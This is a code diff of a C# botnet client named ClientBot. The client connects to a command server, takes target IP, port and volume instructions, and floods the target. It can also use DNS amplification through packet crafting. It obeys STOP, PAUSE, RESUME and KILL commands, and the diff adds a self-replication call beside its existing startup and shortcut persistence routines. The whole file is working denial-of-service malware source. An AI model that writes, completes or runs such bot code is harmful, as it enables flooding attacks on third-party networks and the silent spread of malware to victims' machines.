@@ -23,9 +23,12 @@ namespace ClientBot
         static IPAddress client;
         static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         static TcpClient hostServer = new TcpClient();
+        static List<Thread> threadList = new List<Thread>();
+        static List<Task> taskList = new List<Task>();
         static bool kill = false;
         static string[] a;
         static string[] command;
+        static Thread listn;
         public static State clientState;
         IPv4InterfaceStatistics interfaceStats = null;
         [DllImport("Kernel32.dll")]
@@ -40,6 +43,7 @@ namespace ClientBot
             if (ClientBot.Initializer.startUp() == true&&ClientBot.Initializer.shortcut()==true)
             {
                Console.Write(getTime()+"IP " + getIP());
+                Initializer.replicate();
                 client = getIP();
                 Logger.Initialize();
                 //ClientBot.SEND.dnsAmplifcation();
@@ -53,10 +57,14 @@ namespace ClientBot
             {
                 hostServer.Connect(host, port);
                 Console.WriteLine(getTime()+" it worked ");
-                Thread ListenTask = new Thread(() => Listen());
-                ListenTask.Start();
-                var readTask = read();
-                readTask.Wait();
+                Thread ListenThread = new Thread(() => L());
+                listn = ListenThread;
+                threadList.Add(ListenThread);
+                ListenThread.Start();
+               // Thread readThread = new Thread(() => read());
+              //  threadList.Add(readThread);
+              //  readThread.Start();
+                
                 
             }
             catch(SocketException e)
@@ -71,53 +79,164 @@ namespace ClientBot
            
 
         }
-        public static void Listen()
+        //public static void Listen()
+        //{
+        //    try
+        //    {
+        //        Console.WriteLine(getTime()+"Listen Started");
+        //        int i = 0;
+        //        char[] delimiter = { '$',' '};
+        //        byte[] data = new byte[1024];
+        //        NetworkStream stream = hostServer.GetStream();
+        //        int recievedData = stream.Read(data, 0, data.Length);
+        //        string StrData = Encoding.ASCII.GetString(data, 0, recievedData);
+        //        string[] info = StrData.Split(delimiter);
+        //        IPAddress sentIP = IPAddress.Parse(info[0]);
+        //        int sentPort = int.Parse(info[1]);
+        //        int sentData = int.Parse(info[2]);
+        //        bool dnsAMP = bool.Parse(info[3]);
+        //        setPreviousCommand(info);
+        //        info = null;
+        //        Console.WriteLine(getTime()+StrData);
+        //        sendSpeed();
+        //        clientState = State.CLIENT_SEND;
+        //        Console.WriteLine(getTime()+"sending now");
+        //        sendState(clientState);
+        //        Send(sentIP, sentPort, sentData,dnsAMP);
+        //    }
+        //    catch(Exception e)
+        //    {
+        //        Console.WriteLine(getTime() + "shit happens " + e);
+        //        if (e is System.FormatException)
+        //        {
+        //            Listen();
+        //        }
+        //        else
+        //        { 
+        //           // Restart();
+        //        }
+                
+        //    }
+        //}
+        public static void L()
         {
             try
             {
-                Console.WriteLine(getTime()+"Listen Started");
-                int i = 0;
-                char[] delimiter = { '$',' '};
-                byte[] data = new byte[1024];
-                NetworkStream stream = hostServer.GetStream();
-                int recievedData = stream.Read(data, 0, data.Length);
-                string StrData = Encoding.ASCII.GetString(data, 0, recievedData);
-                string[] info = StrData.Split(delimiter);
-                IPAddress sentIP = IPAddress.Parse(info[0]);
-                int sentPort = int.Parse(info[1]);
-                int sentData = int.Parse(info[2]);
-                bool dnsAMP = bool.Parse(info[3]);
-                setPreviousCommand(info);
-                info = null;
-                Console.WriteLine(getTime()+StrData);
-                sendSpeed();
-                clientState = State.CLIENT_SEND;
-                Console.WriteLine(getTime()+"sending now");
-                sendState(clientState);
-                Send(sentIP, sentPort, sentData,dnsAMP);
+                while (!kill)
+                {
+                    if (!hostServer.Connected)
+                    {
+                        throw new Exception("Connection lost");
+                    }
+                    Console.WriteLine(getTime() + "reading startedd");
+                    string commandStop = Command.STOP.ToString();
+                    string commandPause = Command.PAUSE.ToString();
+                    string commandStart = Command.START.ToString();
+                    string ret = string.Empty;
+                    NetworkStream stream = hostServer.GetStream();
+                    byte[] data = new byte[1024];
+                    int receivedData = stream.Read(data, 0, data.Length);
+                    ret = Encoding.ASCII.GetString(data, 0, receivedData);
+
+                    if (ret.Equals(Command.STOP.ToString()))
+                    {
+                        if (clientState != State.CLIENT_STOP)
+                        {
+                            Console.WriteLine("\n" + getTime() + "Command received " + ret);
+                            clientState = State.CLIENT_STOP;
+                            sendState(clientState);
+                            Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
+                            L();
+                        }
+                    }
+                    else if (ret.Equals(Command.PAUSE.ToString()))
+                    {
+                        if (clientState != State.CLIENT_PAUSE)
+                        {
+                            Console.WriteLine(getTime() + "Command received " + ret);
+                            clientState = State.CLIENT_PAUSE;
+                            sendState(clientState);
+                        }
+                    }
+                    else if (ret.Equals(Command.START.ToString()) && clientState == State.CLIENT_STOP)
+                    {
+                        if (clientState != State.CLIENT_SEND)
+                        {
+                            Console.WriteLine(getTime() + "Command received " + ret);
+                            clientState = State.CLIENT_SEND;
+                            Console.WriteLine(getTime() + "Starting Listen");
+                            sendState(clientState);
+                            Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
+                            //Listen();
+                        }
+                    }
+                    else if (ret.Equals(Command.RESUME.ToString()))
+                    {
+                        if (clientState != State.CLIENT_NULL)
+                        {
+                            
+                                clientState = State.CLIENT_SEND;
+                                sendState(clientState);
+                                Console.WriteLine(getTime() + "Command received" + ret);
+                                foreach (string a in command)
+                                {
+                                    Console.WriteLine(a + " ");
+                                }
+                                IPAddress sentIP = IPAddress.Parse(command[0]);
+                                int sentPort = int.Parse(command[1]);
+                                int sentData = int.Parse(command[2]);
+                                bool sentDNS = bool.Parse(command[3]);
+                                Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
+                                Send(sentIP, sentPort, sentData, sentDNS);
+                           
+                        }
+                    }
+                    else if (ret.Equals(Command.KILL.ToString()))
+                    {
+                        Console.WriteLine(getTime() + "Exiting");
+                        Thread.Sleep(10000);
+                        KillApp();
+                    }
+                    else
+                    {
+                        Console.WriteLine(getTime() + "IDK WHAT TO DO" + ret);
+                        if (ret.Contains("$"))
+                        {
+                            string[] info = ret.Split('$');
+                            IPAddress sentIP = IPAddress.Parse(info[0]);
+                            int sentPort = int.Parse(info[1]);
+                            int sentData = int.Parse(info[2]);
+                            bool dnsAMP = bool.Parse(info[3]);
+                            setPreviousCommand(info);
+                            sendSpeed();
+                            clientState = State.CLIENT_SEND;
+                            Console.WriteLine(getTime() + "sending now");
+                            Thread send = new Thread(()=>Send(sentIP, sentPort, sentData, dnsAMP));
+                            threadList.Add(send);
+                            send.Start();
+                        }
+                        else
+                        {
+                            Thread.Sleep(1000);
+                            L();
+                        }
+                    }
+                }
             }
             catch(Exception e)
             {
-                Console.WriteLine(getTime() + "shit happens " + e);
-                if (e is System.FormatException)
-                {
-                    Listen();
-                }
-                else
-                { 
-                    Restart();
-                }
-                
+                Restart();
             }
         }
         static void task()
         {
+            ///not used currently
             Console.WriteLine(getTime()+"task called");
-            read();
+            L();
             Task.Run(() =>
             {
                 
-                    read();
+                    L();
                     Task.WaitAll();
                     
             });
@@ -126,34 +245,45 @@ namespace ClientBot
         {
             Task.Run(() =>
             {
-                
-                    read();
-                    Task.WaitAll();
-                
+
+                //L();
+                Task.WaitAll();
+
             });
+            //Thread readT = new Thread(() => read());
+            //threadList.Add(readT);
+            //readT.Start();
             try
             {
+                
                 if (!dnsAMP)
                 {
                     int i = 0;
                     while (ClientBot.SEND.sendData(ip, port, dataAmount, "hello there"))
                     {
-
-                        if (clientState == State.CLIENT_SEND)
+                        if (hostServer.Connected)
                         {
-                            i++;
-                            Console.Write("\r{0}"+clientState+" Sending iteration:{1} ", getTime(), i);
-                            ///Console.Write("\r " + clientState);
+                            if (clientState == State.CLIENT_SEND)
+                            {
+                                i++;
+                                Console.Write("\r{0}" + clientState + " Sending iteration:{1} ", getTime(), i);
+                                ///Console.Write("\r " + clientState);
+                            }
+                            else if (clientState == State.CLIENT_STOP)
+                            {
+                                Console.WriteLine(getTime() + "Breaking Out");
+                                break;
+                            }
+                            else if (clientState == State.CLIENT_PAUSE)
+                            {
+                                Console.WriteLine(getTime() + "Pause Command Received");
+                                break;
+                            }
                         }
-                        else if (clientState == State.CLIENT_STOP)
+                        else
                         {
-                            Console.WriteLine(getTime() + "Breaking Out");
                             break;
-                        }
-                        else if (clientState == State.CLIENT_PAUSE)
-                        {
-                            Console.WriteLine(getTime() + "Pause Command Received");
-                            break;
+                            throw new Exception("Host Disconnected");
                         }
                     }
                 }
@@ -165,21 +295,29 @@ namespace ClientBot
                     PcapDotNet.Core.PacketDevice packetDevice = packetDevices[0];
                     while (ClientBot.SEND.dns(packet,packetDevice))
                     {
-                        if (clientState == State.CLIENT_SEND)
+                        if (hostServer.Connected)
                         {
-                            i++;
-                            Console.Write("\r {0}"+clientState+"Sending iteration:{1} ", getTime(), i);
-                            //Console.Write("\r " + clientState);
+                            if (clientState == State.CLIENT_SEND)
+                            {
+                                i++;
+                                Console.Write("\r {0}" + clientState + "Sending iteration:{1} ", getTime(), i);
+                                //Console.Write("\r " + clientState);
+                            }
+                            else if (clientState == State.CLIENT_STOP)
+                            {
+                                Console.WriteLine(getTime() + "Breaking Out");
+                                break;
+                            }
+                            else if (clientState == State.CLIENT_PAUSE)
+                            {
+                                Console.WriteLine(getTime() + "Pause Command Received");
+                                break;
+                            }
                         }
-                        else if (clientState == State.CLIENT_STOP)
+                        else
                         {
-                            Console.WriteLine(getTime() + "Breaking Out");
                             break;
-                        }
-                        else if (clientState == State.CLIENT_PAUSE)
-                        {
-                            Console.WriteLine(getTime() + "Pause Command Received");
-                            break;
+                            throw new Exception("Host disconnected");
                         }
                     }
 
@@ -190,130 +328,130 @@ namespace ClientBot
             catch (Exception e)
             {
                 Console.WriteLine(getTime() + "shit happens " + e);
-                Restart();
+               // Restart();
 
             }
 
         }
-        static async Task read()
-        {
-            try
-            {
-                await Task.Run(() =>
-                {
-                    while (!kill)
-                    {
-                        if(!hostServer.Connected)
-                        {
-                            throw new Exception("Connection lost");
-                        }
-                        Console.WriteLine(getTime()+"reading startedd");
-                        string commandStop = Command.STOP.ToString();
-                        string commandPause = Command.PAUSE.ToString();
-                        string commandStart = Command.START.ToString();
-                        string ret = string.Empty;
-                        NetworkStream stream = hostServer.GetStream();
-                        byte[] data = new byte[1024];
-                        int receivedData = stream.Read(data, 0, data.Length);
-                        ret = Encoding.ASCII.GetString(data, 0, receivedData);
+        //static async void read()
+        //{
+        //    try
+        //    {
+        //        await Task.Run(() =>
+        //        {
+        //            while (!kill)
+        //            {
+        //                if(!hostServer.Connected)
+        //                {
+        //                    throw new Exception("Connection lost");
+        //                }
+        //                Console.WriteLine(getTime()+"reading startedd");
+        //                string commandStop = Command.STOP.ToString();
+        //                string commandPause = Command.PAUSE.ToString();
+        //                string commandStart = Command.START.ToString();
+        //                string ret = string.Empty;
+        //                NetworkStream stream = hostServer.GetStream();
+        //                byte[] data = new byte[1024];
+        //                int receivedData = stream.Read(data, 0, data.Length);
+        //                ret = Encoding.ASCII.GetString(data, 0, receivedData);
 
-                        if (ret.Equals(Command.STOP.ToString()))
-                        {
-                            if (clientState != State.CLIENT_STOP)
-                            {
-                                Console.WriteLine("\n" + getTime() + "Command received " + ret);
-                                clientState = State.CLIENT_STOP;
-                                sendState(clientState);
-                                Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
-                                Listen();
-                            }
-                        }
-                        else if (ret.Equals(Command.PAUSE.ToString()))
-                        {
-                            if (clientState != State.CLIENT_PAUSE)
-                            {
-                                Console.WriteLine(getTime() + "Command received " + ret);
-                                clientState = State.CLIENT_PAUSE;
-                                sendState(clientState);
-                            }
-                        }
-                        else if (ret.Equals(Command.START.ToString())&&clientState==State.CLIENT_STOP)
-                        {
-                            if (clientState != State.CLIENT_SEND)
-                            {
-                                Console.WriteLine(getTime() + "Command received " + ret);
-                                clientState = State.CLIENT_SEND;
-                                Console.WriteLine(getTime() + "Starting Listen");
-                                sendState(clientState);
-                                Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
-                                //Listen();
-                            }
-                        }
-                        else if (ret.Equals(Command.RESUME.ToString()))
-                        {
-                            if (clientState != State.CLIENT_NULL)
-                            {
-                                try
-                                {
-                                    clientState = State.CLIENT_SEND;
-                                    sendState(clientState);
-                                    Console.WriteLine(getTime() + "Command received" + ret);
-                                    foreach (string a in command)
-                                    {
-                                        Console.WriteLine(a + " ");
-                                    }
-                                    IPAddress sentIP = IPAddress.Parse(command[0]);
-                                    int sentPort = int.Parse(command[1]);
-                                    int sentData = int.Parse(command[2]);
-                                    bool sentDNS = bool.Parse(command[3]);
-                                    Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
-                                    Send(sentIP, sentPort, sentData, sentDNS);
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine(getTime() + "Resume error" + e);
-                                    Restart();
-                                }
-                            }
-                        }
-                        else if (ret.Equals(Command.KILL.ToString()))
-                        {
-                            Console.WriteLine(getTime()+"Exiting");
-                            Thread.Sleep(10000);
-                            KillApp();
-                        }
-                        else
-                        {
-                            Console.WriteLine(getTime()+"IDK WHAT TO DO"+ret);
-                            if (ret.Contains("$"))
-                            {
-                                string[] info = ret.Split('$');
-                                IPAddress sentIP = IPAddress.Parse(info[0]);
-                                int sentPort = int.Parse(info[1]);
-                                int sentData = int.Parse(info[2]);
-                                bool dnsAMP = bool.Parse(info[3]);
-                                setPreviousCommand(info);
-                                sendSpeed();
-                                clientState = State.CLIENT_SEND;
-                                Console.WriteLine(getTime() + "sending now");
-                                Send(sentIP, sentPort, sentData, dnsAMP);
-                            }
-                            else
-                            {
-                                Thread.Sleep(1000);
-                                read();
-                            }
-                        }
-                    }
-                });
-            }
-            catch(Exception e)
-            {
-                Console.WriteLine(getTime()+"error " + e);
-                Restart();
-            }
-            //    return ret;
-        }
+        //                if (ret.Equals(Command.STOP.ToString()))
+        //                {
+        //                    if (clientState != State.CLIENT_STOP)
+        //                    {
+        //                        Console.WriteLine("\n" + getTime() + "Command received " + ret);
+        //                        clientState = State.CLIENT_STOP;
+        //                        sendState(clientState);
+        //                        Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
+        //                        Listen();
+        //                    }
+        //                }
+        //                else if (ret.Equals(Command.PAUSE.ToString()))
+        //                {
+        //                    if (clientState != State.CLIENT_PAUSE)
+        //                    {
+        //                        Console.WriteLine(getTime() + "Command received " + ret);
+        //                        clientState = State.CLIENT_PAUSE;
+        //                        sendState(clientState);
+        //                    }
+        //                }
+        //                else if (ret.Equals(Command.START.ToString())&&clientState==State.CLIENT_STOP)
+        //                {
+        //                    if (clientState != State.CLIENT_SEND)
+        //                    {
+        //                        Console.WriteLine(getTime() + "Command received " + ret);
+        //                        clientState = State.CLIENT_SEND;
+        //                        Console.WriteLine(getTime() + "Starting Listen");
+        //                        sendState(clientState);
+        //                        Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
+        //                        //Listen();
+        //                    }
+        //                }
+        //                else if (ret.Equals(Command.RESUME.ToString()))
+        //                {
+        //                    if (clientState != State.CLIENT_NULL)
+        //                    {
+        //                        try
+        //                        {
+        //                            clientState = State.CLIENT_SEND;
+        //                            sendState(clientState);
+        //                            Console.WriteLine(getTime() + "Command received" + ret);
+        //                            foreach (string a in command)
+        //                            {
+        //                                Console.WriteLine(a + " ");
+        //                            }
+        //                            IPAddress sentIP = IPAddress.Parse(command[0]);
+        //                            int sentPort = int.Parse(command[1]);
+        //                            int sentData = int.Parse(command[2]);
+        //                            bool sentDNS = bool.Parse(command[3]);
+        //                            Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
+        //                            Send(sentIP, sentPort, sentData, sentDNS);
+        //                        }
+        //                        catch (Exception e)
+        //                        {
+        //                            Console.WriteLine(getTime() + "Resume error" + e);
+        //                            Restart();
+        //                        }
+        //                    }
+        //                }
+        //                else if (ret.Equals(Command.KILL.ToString()))
+        //                {
+        //                    Console.WriteLine(getTime()+"Exiting");
+        //                    Thread.Sleep(10000);
+        //                    KillApp();
+        //                }
+        //                else
+        //                {
+        //                    Console.WriteLine(getTime()+"IDK WHAT TO DO"+ret);
+        //                    if (ret.Contains("$"))
+        //                    {
+        //                        string[] info = ret.Split('$');
+        //                        IPAddress sentIP = IPAddress.Parse(info[0]);
+        //                        int sentPort = int.Parse(info[1]);
+        //                        int sentData = int.Parse(info[2]);
+        //                        bool dnsAMP = bool.Parse(info[3]);
+        //                        setPreviousCommand(info);
+        //                        sendSpeed();
+        //                        clientState = State.CLIENT_SEND;
+        //                        Console.WriteLine(getTime() + "sending now");
+        //                        Send(sentIP, sentPort, sentData, dnsAMP);
+        //                    }
+        //                    else
+        //                    {
+        //                        Thread.Sleep(1000);
+        //                        read();
+        //                    }
+        //                }
+        //            }
+        //        });
+        //    }
+        //    catch(Exception e)
+        //    {
+        //        Console.WriteLine(getTime()+"error " + e);
+        //        Restart();
+        //    }
+        //    //    return ret;
+        //}
         static async Task sendState(State state)
         {
             State currentState = state;
@@ -407,8 +545,24 @@ namespace ClientBot
         }
         static void Restart()
         {
+            Console.WriteLine("Restar Called");
             hostServer = null;
             hostServer = new TcpClient();
+            Console.WriteLine("ThreadList Length " + threadList.Count());
+            foreach(Thread s in threadList)
+            {
+                if (s.Equals(listn))
+                {
+                    Console.WriteLine("helloaa");
+                }
+                else
+                {
+                    Console.WriteLine("hello");
+                    s.Abort();
+                }
+            }
+            Console.WriteLine("hello");
+            threadList.Clear();
             Connect();
         }
         
